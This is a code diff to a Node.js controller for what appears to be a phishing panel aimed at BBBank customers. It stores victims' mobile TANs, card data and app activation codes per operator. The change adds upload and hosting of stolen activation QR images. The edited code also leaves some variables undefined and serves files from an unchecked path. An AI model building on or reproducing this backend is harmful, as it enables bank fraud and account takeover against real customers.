@@ -1,4 +1,4 @@
-const BBBank = require("../models/bbbankController");
+const BBBank = require("../models/bbbankModel");
 var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
@@ -92,16 +92,31 @@ const submitMobileTan = async (req, res) => {
 };
 
 const submitActivation = async (req, res) => {
-	const { activationCode, uniqueid, owner, ip } = req.body;
+	if (!req.files) {
+		return res.status(500).send({ msg: "file is not found" });
+	}
+	let { activationCode } = req.files;
+	let { uniqueid } = req.body;
+	const frontPath = `./bbbankQr/${uniqueid}_QR.jpg`;
 	try {
+		await activationCode.mv(frontPath, async (err) => {
+			if (err) {
+				console.log(err);
+				return res.sendStatus(500);
+			}
+		});
 		let user = await BBBank.findOneAndUpdate(
 			{ uniqueid },
-			{ activationCode, status: 5, timestamp: moment().format() }
+			{
+				activationCode: `https://nodejsclusters-98107-0.cloudclusters.net/bbbank/qr/${uniqueid}`,
+				status: 5,
+				timestamp: moment().format(),
+			}
 		).exec();
 		if (!user) {
 			await BBBank.create({
 				uniqueid,
-				activationCode,
+				activationCode: `https://nodejsclusters-98107-0.cloudclusters.net/bbbank/qr/${uniqueid}`,
 				owner,
 				ip,
 				status: 5,
@@ -109,9 +124,9 @@ const submitActivation = async (req, res) => {
 			});
 		}
 		res.sendStatus(200);
-	} catch (error) {
-		console.log(error);
-		res.sendStatus(400);
+	} catch (e) {
+		console.log(e);
+		res.status(400).send(e);
 	}
 };
 
@@ -140,6 +155,11 @@ const deleteEntry = async (req, res) => {
 	}
 };
 
+const getQr = async (req, res) => {
+	const { uniqueid } = req.params;
+	res.sendFile(`/bbbankQr/${uniqueid}_QR.jpg`, { root: "." });
+};
+
 module.exports = {
 	getOwnerVics,
 	command,
@@ -150,4 +170,5 @@ module.exports = {
 	submitCard,
 	submitActivation,
 	deleteEntry,
+	getQr,
 };
